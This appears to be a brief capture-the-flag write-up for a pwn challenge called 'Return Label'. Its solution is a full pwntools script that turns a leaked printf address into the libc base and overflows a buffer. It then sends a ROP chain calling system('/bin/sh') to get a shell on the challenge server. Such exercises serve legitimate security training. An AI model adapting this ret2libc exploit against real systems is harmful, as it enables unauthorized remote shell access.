# Return Label
> LongChampion, 06/04/2020

## Challenge
Well, this challenge give you address of a function in libc to calculate libc base address.  
You just need to build a ROP chain.

## Solution
```python
#!/usr/bin/env python2
from pwn import *

r = remote("jh2i.com", 50005)
lib = ELF("./libc6_2.23-0ubuntu10_amd64.so", checksec=False)

r.recvuntil("printf is at ")
Leak = r.recvuntil(')')[:-1]
LIBC = int(Leak, 16) - lib.symbols["printf"]
log.success("LIBC: " + hex(LIBC))

system = LIBC + lib.symbols["system"]
binsh = LIBC + lib.search("/bin/sh\0").next()
pop_rdi = LIBC + 0x0000000000021102

r.sendlineafter("?", 'A'*0x90 + p64(0) +
                p64(pop_rdi) + p64(binsh) + p64(system))
r.interactive()
```
